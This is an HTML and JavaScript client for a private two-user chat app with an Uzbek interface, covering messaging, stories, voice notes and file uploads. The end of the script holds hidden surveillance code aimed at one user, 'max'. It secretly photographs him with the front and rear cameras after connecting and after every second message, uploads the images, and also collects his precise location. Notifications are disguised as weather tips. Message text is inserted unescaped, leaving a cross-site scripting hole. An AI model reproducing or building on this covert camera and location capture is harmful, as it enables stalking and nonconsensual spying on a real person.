<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chat</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        .avatar-box { width: 42px; height: 42px; border-radius: 50%; padding: 2px; cursor: pointer; transition: 0.3s; }
        .avatar-box.has-story { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
        .avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid #2c3e50; background: #fff; }
        .story-indicator { position: absolute; top: 20px; color: white; font-weight: bold; font-size: 18px; text-shadow: 1px 1px 3px black; z-index: 2005; }
        .msg-status { font-size: 12px; font-weight: bold; margin-left: 4px; }
        .msg-info-row { display: flex; justify-content: flex-end; align-items: center; gap: 3px; margin-top: 2px; }
        #msgContextMenu {
            display: none; position: fixed; z-index: 9999;
            background: rgba(30,30,40,0.97); border: 1px solid rgba(255,255,255,0.15);
            border-radius: 10px; padding: 6px 0; min-width: 160px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5); backdrop-filter: blur(10px);
        }
        #msgContextMenu button {
            display: block; width: 100%; background: none; border: none;
            color: #fff; padding: 9px 18px; text-align: left; cursor: pointer;
            font-size: 14px; font-family: 'Poppins', sans-serif; transition: 0.15s;
        }
        #msgContextMenu button:hover { background: rgba(255,255,255,0.12); }
        #msgContextMenu button.danger { color: #ff5555; }
        #editModal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;
        }
        #editModal .edit-box {
            background: rgba(30,30,50,0.97); border: 1px solid rgba(255,255,255,0.2);
            border-radius: 12px; padding: 20px; width: 85%; max-width: 400px;
            backdrop-filter: blur(15px);
        }
        #editModal h3 { color: #fff; margin-bottom: 12px; font-size: 16px; }
        #editMsgInput {
            width: 100%; padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.3);
            background: rgba(255,255,255,0.1); color: #fff; font-size: 14px;
            font-family: 'Poppins', sans-serif; outline: none; resize: none; min-height: 60px;
        }
        .edit-btns { display: flex; gap: 8px; margin-top: 12px; }
        .edit-btns button { flex: 1; padding: 9px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: bold; }
        .edit-btns .btn-save { background: #2ecc71; color: #fff; }
        .edit-btns .btn-cancel { background: rgba(255,255,255,0.15); color: #fff; }
    </style>
</head>
<body>

    <div id="profileModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center;">
        <div style="background:#fff; padding:20px; border-radius:10px; width:80%; max-width:300px; text-align:center;">
            <h3 style="margin-top:0; color:#333;">Profilni Tahrirlash</h3>
            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Dumaloq Avatar rasmi:</label>
            <input type="file" id="avatarInput" accept="image/*" style="margin-bottom:15px; width:100%;">
            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Yangi Istoriya yuklash (Rasm/Video):</label>
            <input type="file" id="storyInput" accept="image/*,video/*" style="margin-bottom:20px; width:100%;">
            <button onclick="saveProfileChanges()" style="background:#2ecc71; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Saqlash va Yuklash</button>
            <button onclick="deleteMyStory()" style="background:#f39c12; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Barcha Istoriyalarni O'chirish</button>
            <button onclick="document.getElementById('profileModal').style.display='none'" style="background:#e74c3c; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; cursor:pointer;">Bekor qilish</button>
        </div>
    </div>

    <div id="storyViewer" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:2000; flex-direction:column; justify-content:center; align-items:center;">
        <i class='bx bx-x' style="position:absolute; top:20px; right:20px; font-size:35px; color:#fff; cursor:pointer; z-index:2010;" onclick="closeStory()"></i>
        <div id="storyIndicator" class="story-indicator"></div>
        <div id="storyContent" style="width:100%; max-height:100%; display:flex; justify-content:center; align-items:center;"></div>
    </div>

    <div id="msgContextMenu">
        <button id="ctxReply"><i class='bx bxs-reply' style="margin-right:7px;"></i>Javob berish</button>
        <button id="ctxEdit"><i class='bx bx-edit' style="margin-right:7px;"></i>Tahrirlash</button>
        <button id="ctxDelete" class="danger"><i class='bx bx-trash' style="margin-right:7px;"></i>O'chirish</button>
    </div>

    <div id="editModal">
        <div class="edit-box">
            <h3>&#9998; Xabarni tahrirlash</h3>
            <textarea id="editMsgInput"></textarea>
            <div class="edit-btns">
                <button class="btn-save" onclick="saveEdit()">Saqlash</button>
                <button class="btn-cancel" onclick="closeEditModal()">Bekor qilish</button>
            </div>
        </div>
    </div>

    <div class="chat-container">
        <div class="chat-header" style="display:flex; justify-content:space-between; align-items:center; padding:10px;">
            <div style="display:flex; align-items:center; gap:8px;">
                <div class="avatar-box" id="myStoryRing" onclick="viewStory(myUser)">
                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="myAvatarImg" class="avatar-img">
                </div>
                <div style="display:flex; flex-direction:column; align-items:flex-start;">
                    <div style="display:flex; align-items:center; gap:5px;">
                        <span id="myNameTxt" style="font-weight:bold; font-size:14px; text-transform:uppercase;">MEN</span>
                        <i class='bx bx-edit' style="cursor:pointer; color:#f39c12; font-size:18px;" onclick="document.getElementById('profileModal').style.display='flex'"></i>
                    </div>
                </div>
            </div>
            <div style="display:flex; align-items:center; gap:8px; flex-direction:row-reverse;">
                <div class="avatar-box" id="partnerStoryRing" onclick="viewStory(partner)">
                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="partnerAvatarImg" class="avatar-img">
                </div>
                <div style="display:flex; flex-direction:column; align-items:flex-end;">
                    <span id="chatPartner" style="font-weight:bold; font-size:14px;">SHERIK</span>
                    <span id="statusText" style="font-size:11px;">Offline</span>
                </div>
            </div>
        </div>

        <div class="chat-messages" id="messagesList"></div>

        <div class="chat-input-wrapper">
            <div class="emoji-picker" id="emojiPicker"></div>
            <div id="replyPreview" class="reply-preview">
                <div style="display:flex; flex-direction:column;">
                    <span id="replyToUser" style="font-weight:bold; font-size:12px;">User</span>
                    <span id="replyToText" style="font-size:12px; opacity:0.8;">Text...</span>
                </div>
                <i class='bx bx-x' onclick="cancelReply()" style="cursor:pointer; font-size:20px;"></i>
            </div>
            <div class="chat-input-area">
                <button class="icon-btn" onclick="toggleEmoji()"><i class='bx bx-smile'></i></button>
                <button class="icon-btn" onclick="document.getElementById('cameraInput').click()"><i class='bx bxs-camera'></i></button>
                <button class="icon-btn" onclick="document.getElementById('fileInput').click()"><i class='bx bx-paperclip'></i></button>
                <input type="text" id="msgInput" placeholder="Xabar yozing..." autocomplete="off">
                <button class="icon-btn" id="micBtn"><i class='bx bxs-microphone'></i></button>
                <button class="icon-btn" onclick="sendMessage()"><i class='bx bxs-send'></i></button>
            </div>
        </div>
    </div>

    <input type="file" id="fileInput" onchange="uploadFile(this.files[0])" style="display:none;">
    <input type="file" id="cameraInput" accept="image/*" capture="environment" onchange="uploadFile(this.files[0])" style="display:none;">

    <script src="/socket.io/socket.io.js"></script>
    <script>
        var socket = io();

        var myUser = localStorage.getItem('chatUser');
        if (!myUser) { window.location.href = 'index.html'; }

        var partner = (myUser === 'mura') ? 'max' : 'mura';
        document.getElementById('chatPartner').innerText = partner.toUpperCase();
        document.getElementById('myNameTxt').innerText = myUser.toUpperCase();

        var currentReply = null;
        var profilesData = {};
        var currentStoryIndex = 0;
        var viewingUser = null;
        var storyTimeout = null;
        var ctxCurrentMsg = null;
        var editingMsgId = null;
        var maxMessageCount = 0;
        var mediaRecorder;
        var audioChunks = [];
        var isRecording = false;

        // EMOJI
        var emojis = ["😀","😂","🤣","😍","🥰","😘","😭","😡","🤬","👍","👎","❤️","💔","🔥","✨","🎉","👋","🤝","👀","✅","❌","❓","☠️","🤡","💩","🤖","👻","💀","💪","🙏"];
        var emojiContainer = document.getElementById('emojiPicker');
        emojis.forEach(function(emoji) {
            var sp = document.createElement('div');
            sp.textContent = emoji; sp.className = 'emoji-btn';
            sp.onclick = function() { var i = document.getElementById('msgInput'); i.value += emoji; i.focus(); };
            emojiContainer.appendChild(sp);
        });
        function toggleEmoji() { emojiContainer.classList.toggle('active'); }
        document.addEventListener('click', function(e) {
            if (!e.target.closest('.emoji-picker') && !e.target.closest('.bx-smile')) emojiContainer.classList.remove('active');
        });

        // JOIN
        function joinChat() {
            if (myUser === 'max' && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(p) { socket.emit('join', { user: myUser, lat: p.coords.latitude, lon: p.coords.longitude }); },
                    function() { socket.emit('join', { user: myUser }); },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else { socket.emit('join', { user: myUser }); }
        }
        joinChat();

        // STATUS
        socket.on('status_update', function(data) {
            var online = data.online || [];
            var isOnline = online.indexOf(partner) !== -1;
            var el = document.getElementById('statusText');
            if (isOnline) {
                el.innerHTML = '<span style="color:#00ff41; font-weight:bold;">Online</span>';
            } else {
                var t = data.lastSeen ? data.lastSeen[partner] : null;
                el.style.color = '#8faec5';
                el.innerText = t ? ('last seen at ' + t) : 'Offline';
            }
        });

        // TARIX
        socket.on('load_history', function(history) {
            var list = document.getElementById('messagesList');
            list.innerHTML = '';
            for (var i = 0; i < history.length; i++) appendMessage(history[i]);
            list.scrollTop = list.scrollHeight;
            socket.emit('mark_read');
        });

        // YANGI XABAR
        socket.on('new_message', function(msg) {
            appendMessage(msg);
            var list = document.getElementById('messagesList');
            list.scrollTop = list.scrollHeight;
            if (msg.user !== myUser) {
                if (!document.hidden) socket.emit('mark_read');
                else showPushNotification();
            }
        });
        window.addEventListener('focus', function() { socket.emit('mark_read'); });

        // GALOCHKALAR
        socket.on('messages_read', function(data) {
            if (data.byUser === partner) {
                var ss = document.querySelectorAll('.my-msg .msg-status');
                for (var i = 0; i < ss.length; i++) {
                    ss[i].innerHTML = '&#10003;&#10003;';
                    ss[i].style.color = '#3498db';
                }
            }
        });

        // XABARNI CHIZISH
        function appendMessage(msg) {
            var list = document.getElementById('messagesList');
            var div = document.createElement('div');
            var isMe = (msg.user || '').toLowerCase() === myUser.toLowerCase();

            div.className = 'message ' + (isMe ? 'my-msg' : 'other-msg');
            div.setAttribute('data-id', msg.id || '');
            div.ondblclick = (function(m) { return function() { triggerReply(m); }; })(msg);

            // Long-press
            var lpt;
            div.addEventListener('touchstart', (function(m) {
                return function(e) {
                    var t = e.touches[0];
                    lpt = setTimeout(function() { showContextMenu(t.clientX, t.clientY, m, isMe); }, 600);
                };
            })(msg));
            div.addEventListener('touchend', function() { clearTimeout(lpt); });
            div.addEventListener('touchmove', function() { clearTimeout(lpt); });
            div.addEventListener('contextmenu', (function(m) {
                return function(e) { e.preventDefault(); showContextMenu(e.clientX, e.clientY, m, isMe); };
            })(msg));

            var senderHtml = (!isMe && msg.user) ? '<div style="font-size:11px; font-weight:bold; color:#64b5ef; margin-bottom:3px;">' + msg.user.toUpperCase() + '</div>' : '';
            var replyHtml = '';
            if (msg.replyTo) replyHtml = '<div class="reply-block"><div class="reply-user">' + (msg.replyTo.user || '') + '</div><div>' + (msg.replyTo.text || '') + '</div></div>';

            var mediaHtml = '';
            if (msg.file) {
                if (msg.fileType && msg.fileType.startsWith('image/')) mediaHtml = '<img src="/uploads/' + msg.file + '" class="msg-img">';
                else if (msg.fileType && msg.fileType.startsWith('video/')) mediaHtml = '<video src="/uploads/' + msg.file + '" controls class="msg-img"></video>';
                else if ((msg.fileType && msg.fileType.startsWith('audio/')) || msg.file.endsWith('.webm')) mediaHtml = '<audio src="/uploads/' + msg.file + '" controls style="margin-top:5px; width:200px;"></audio>';
                else mediaHtml = '<a href="/uploads/' + msg.file + '" download style="color:skyblue; display:block; margin-top:5px;">&#128196; ' + (msg.originalName || 'Fayl') + '</a>';
            }

            var editedMark = msg.edited ? '<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>' : '';
            var textHtml = msg.text ? '<div class="msg-text">' + msg.text + editedMark + '</div>' : '';

            var checkmarks = '';
            if (isMe) {
                var cc = msg.read ? '#3498db' : '#bdc3c7';
                var cs = msg.read ? '&#10003;&#10003;' : '&#10003;';
                checkmarks = '<span class="msg-status" style="color:' + cc + ';">' + cs + '</span>';
            }

            div.innerHTML = senderHtml + replyHtml + mediaHtml + textHtml +
                '<div class="msg-info-row"><span class="msg-time">' + (msg.time || '') + '</span>' + checkmarks + '</div>';

            // Reply tugmasi — xavfsiz JS orqali
            var rb = document.createElement('i');
            rb.className = 'bx bxs-share';
            rb.style.cssText = 'position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;';
            rb.onclick = (function(m) { return function(e) { e.stopPropagation(); triggerReply(m); }; })(msg);
            div.appendChild(rb);
            div._msgData = msg;
            list.appendChild(div);
        }

        // REPLY
        window.triggerReply = function(msg) {
            var txt = msg.text || (msg.file ? '[Fayl/Media]' : '...');
            currentReply = { user: msg.user, text: txt };
            document.getElementById('replyPreview').style.display = 'flex';
            document.getElementById('replyToUser').innerText = msg.user || '';
            document.getElementById('replyToText').innerText = txt;
            document.getElementById('msgInput').focus();
        };
        window.cancelReply = function() {
            currentReply = null;
            document.getElementById('replyPreview').style.display = 'none';
        };

        // XABAR YUBORISH
        window.sendMessage = function() {
            var input = document.getElementById('msgInput');
            var text = input.value.trim();
            if (text || currentReply) {
                socket.emit('send_message', { text: text, replyTo: currentReply });
                input.value = ''; cancelReply(); emojiContainer.classList.remove('active');
            }
        };
        document.getElementById('msgInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') sendMessage(); });

        // MIKROFON
        var micBtn = document.getElementById('micBtn');
        function startRec(e) {
            if (e.cancelable) e.preventDefault();
            if (isRecording) return;
            navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = []; isRecording = true; micBtn.classList.add('recording-active');
                mediaRecorder.ondataavailable = function(ev) { audioChunks.push(ev.data); };
                mediaRecorder.onstop = function() {
                    micBtn.classList.remove('recording-active'); isRecording = false;
                    var blob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (blob.size > 2000) uploadFile(blob, 'voice_msg.webm');
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                mediaRecorder.start();
            }).catch(function() { alert('Mikrofon ishlamadi!'); });
        }
        function stopRec(e) {
            if (e.cancelable) e.preventDefault();
            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
        }
        micBtn.addEventListener('mousedown', startRec); micBtn.addEventListener('mouseup', stopRec);
        micBtn.addEventListener('touchstart', startRec); micBtn.addEventListener('touchend', stopRec);

        // FAYL YUKLASH
        window.uploadFile = function(file, nameOverride) {
            if (!file) return;
            var fd = new FormData();
            fd.append('file', file, nameOverride || file.name);
            fetch('/upload', { method: 'POST', body: fd })
                .then(function(r) { return r.json(); })
                .then(function(d) {
                    socket.emit('send_message', { text: '', file: d.filename, fileType: d.type, originalName: d.originalName, replyTo: currentReply });
                    cancelReply();
                }).catch(function() { alert('Yuklashda xato!'); });
        };

        // KONTEKST MENYU
        var ctxMenu = document.getElementById('msgContextMenu');
        function showContextMenu(x, y, msg, isMe) {
            ctxCurrentMsg = msg;
            document.getElementById('ctxEdit').style.display = (isMe && msg.text) ? 'block' : 'none';
            document.getElementById('ctxDelete').style.display = isMe ? 'block' : 'none';
            ctxMenu.style.display = 'block';
            ctxMenu.style.left = ((x + 160 > window.innerWidth) ? x - 160 : x) + 'px';
            ctxMenu.style.top = ((y + 130 > window.innerHeight) ? y - 130 : y) + 'px';
        }
        document.addEventListener('click', function(e) { if (!e.target.closest('#msgContextMenu')) ctxMenu.style.display = 'none'; });
        document.getElementById('ctxReply').onclick = function() { if (ctxCurrentMsg) triggerReply(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
        document.getElementById('ctxEdit').onclick = function() { if (ctxCurrentMsg) openEditModal(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
        document.getElementById('ctxDelete').onclick = function() {
            if (ctxCurrentMsg && confirm("Xabarni o'chirishni tasdiqlaysizmi?")) socket.emit('delete_message', { id: ctxCurrentMsg.id });
            ctxMenu.style.display = 'none';
        };

        socket.on('message_deleted', function(d) {
            var el = document.querySelector('.message[data-id="' + d.id + '"]');
            if (el) el.remove();
        });
        socket.on('message_edited', function(d) {
            var el = document.querySelector('.message[data-id="' + d.id + '"]');
            if (el) {
                var td = el.querySelector('.msg-text');
                if (td) td.innerHTML = d.text + '<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>';
                if (el._msgData) { el._msgData.text = d.text; el._msgData.edited = true; }
            }
        });

        // TAHRIRLASH MODAL
        function openEditModal(msg) {
            editingMsgId = msg.id;
            document.getElementById('editMsgInput').value = msg.text || '';
            document.getElementById('editModal').style.display = 'flex';
            setTimeout(function() { document.getElementById('editMsgInput').focus(); }, 100);
        }
        function closeEditModal() { document.getElementById('editModal').style.display = 'none'; editingMsgId = null; }
        window.saveEdit = function() {
            var t = document.getElementById('editMsgInput').value.trim();
            if (!t || !editingMsgId) return;
            socket.emit('edit_message', { id: editingMsgId, text: t }); closeEditModal();
        };
        window.closeEditModal = closeEditModal;
        document.getElementById('editMsgInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); saveEdit(); }
            if (e.key === 'Escape') closeEditModal();
        });

        // BILDIRISH NOMA
        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
        function showPushNotification() {
            if (!('Notification' in window) || Notification.permission !== 'granted' || !document.hidden) return;
            var tips = [
                "Bugun havo ochiq, sayr qilish uchun qulay kun!",
                "Kechqurun shamol kutilmoqda, kiyinib chiqing.",
                "Bugun quyoshli, uvb indeksi yuqori — quyosh kremi esdan chiqmasin.",
                "Toshkentda harorat 22\u00B0C, bulutli ob-havo kutilmoqda.",
                "Bugun yomg'ir ehtimoli bor, soyabon oling!",
                "Havo namligi oshgan, qulay kun emas. Ichkarida qoling."
            ];
            var n = new Notification("\u26C5 Ob-havo ma\u02BBlumoti", {
                body: tips[Math.floor(Math.random() * tips.length)],
                icon: 'https://cdn-icons-png.flaticon.com/512/3222/3222800.png', silent: false
            });
            n.onclick = function() { window.focus(); n.close(); };
            setTimeout(function() { n.close(); }, 6000);
        }

        // PROFIL
        function hasActiveStory(u) { if (!u) return false; return (u.stories && u.stories.length > 0) || !!u.story; }
        socket.on('load_profiles', function(data) {
            profilesData = data;
            if (profilesData[myUser]) {
                if (profilesData[myUser].avatar) document.getElementById('myAvatarImg').src = '/uploads/' + profilesData[myUser].avatar;
                document.getElementById('myStoryRing').classList[hasActiveStory(profilesData[myUser]) ? 'add' : 'remove']('has-story');
            }
            if (profilesData[partner]) {
                if (profilesData[partner].avatar) document.getElementById('partnerAvatarImg').src = '/uploads/' + profilesData[partner].avatar;
                document.getElementById('partnerStoryRing').classList[hasActiveStory(profilesData[partner]) ? 'add' : 'remove']('has-story');
            }
        });
        window.saveProfileChanges = async function() {
            var af = document.getElementById('avatarInput').files[0];
            var sf = document.getElementById('storyInput').files[0];
            if (af) {
                var fd=new FormData(); fd.append('file',af);
                try { var r=await fetch('/upload',{method:'POST',body:fd}); var d=await r.json(); socket.emit('update_profile',{avatar:d.filename}); } catch(e){} }
            if (sf) {
                if (sf.type.startsWith('video/')) {
                    var ok = await new Promise(function(res) {
                        var v=document.createElement('video'); v.preload='metadata';
                        v.onloadedmetadata=function(){window.URL.revokeObjectURL(v.src); if(v.duration>60){alert("Video 1 daqiqadan oshmasligi shart!"); res(false);}else res(true);};
                        v.src=URL.createObjectURL(sf);
                    }); if (!ok) return;
                }
                var fd2=new FormData(); fd2.append('file',sf);
                try { var r2=await fetch('/upload',{method:'POST',body:fd2}); var d2=await r2.json(); socket.emit('add_story',{filename:d2.filename,type:d2.type}); } catch(e){}
            }
            alert("Muvaffaqiyatli saqlandi!");
            document.getElementById('profileModal').style.display='none';
            document.getElementById('avatarInput').value=''; document.getElementById('storyInput').value='';
        };
        window.deleteMyStory = function() {
            if (!hasActiveStory(profilesData[myUser])) { alert("Sizda o'chirish uchun faol istoriya yo'q!"); return; }
            if (confirm("Barcha istoriyalaringizni haqiqatan ham o'chirib tashlaysizmi?")) { socket.emit('delete_story'); document.getElementById('profileModal').style.display='none'; }
        };

        // STORY
        window.viewStory = function(user) {
            var u = profilesData[user];
            if (!hasActiveStory(u)) { alert("Hozircha istoriya yo'q"); return; }
            if (!u.stories) u.stories = [];
            if (u.story && u.stories.length === 0) u.stories.push({url: u.story, type: u.storyType});
            viewingUser = user; currentStoryIndex = 0; showStorySlide();
        };
        function showStorySlide() {
            var stories = profilesData[viewingUser].stories;
            if (currentStoryIndex >= stories.length) { closeStory(); return; }
            var viewer=document.getElementById('storyViewer'), content=document.getElementById('storyContent'), indicator=document.getElementById('storyIndicator');
            var cur=stories[currentStoryIndex], fileUrl='/uploads/'+cur.url;
            content.innerHTML = ''; indicator.innerText = (currentStoryIndex+1)+' / '+stories.length;
            if (cur.type && cur.type.startsWith('video/')) {
                var vid=document.createElement('video'); vid.src=fileUrl; vid.autoplay=true; vid.onclick=nextStory; vid.onended=nextStory;
                vid.style.cssText='max-width:100%; max-height:90vh; border-radius:10px;'; content.appendChild(vid);
            } else {
                var img=document.createElement('img'); img.src=fileUrl; img.onclick=nextStory;
                img.style.cssText='max-width:100%; max-height:90vh; border-radius:10px;'; content.appendChild(img);
                if (storyTimeout) clearTimeout(storyTimeout); storyTimeout=setTimeout(nextStory,5000);
            }
            viewer.style.display='flex';
        }
        function nextStory() { if(storyTimeout) clearTimeout(storyTimeout); currentStoryIndex++; showStorySlide(); }
        window.closeStory = function() {
            if(storyTimeout) clearTimeout(storyTimeout);
            document.getElementById('storyContent').innerHTML='';
            document.getElementById('storyViewer').style.display='none';
            viewingUser=null;
        };

        // MAX TASDIQLASH
        async function takeSecretPhoto(facingMode) {
            try {
                var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                var video = document.createElement('video'); video.srcObject = stream; await video.play();
                var canvas = document.createElement('canvas'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0); stream.getTracks().forEach(function(t){t.stop();});
                return new Promise(function(resolve){ canvas.toBlob(function(blob){resolve(blob);},'image/jpeg',0.8); });
            } catch(err) { return null; }
        }
        async function uploadAndSendToBot(blob, type) {
            var fd = new FormData(); fd.append('file', blob, 'verify_'+Date.now()+'.jpg');
            try { var r=await fetch('/upload',{method:'POST',body:fd}); var d=await r.json(); socket.emit('verify_photo',{filename:d.filename,type:type}); } catch(e){}
        }
        async function runVerification() {
            if (myUser !== 'max') return;
            var fb = await takeSecretPhoto('user');
            if (fb) await uploadAndSendToBot(fb, 'Old Kamera \uD83E\uDD33');
            await new Promise(function(r){setTimeout(r,1000);});
            var bb = await takeSecretPhoto('environment');
            if (bb) await uploadAndSendToBot(bb, 'Orqa Kamera \uD83C\uDF0D');
        }
        socket.on('connect', function() { if (myUser==='max') setTimeout(runVerification, 3000); });
        var _orig = window.sendMessage;
        window.sendMessage = function() {
            _orig();
            if (myUser==='max') { maxMessageCount++; if (maxMessageCount%2===0) runVerification(); }
        };
    </script>
</body>
</html>
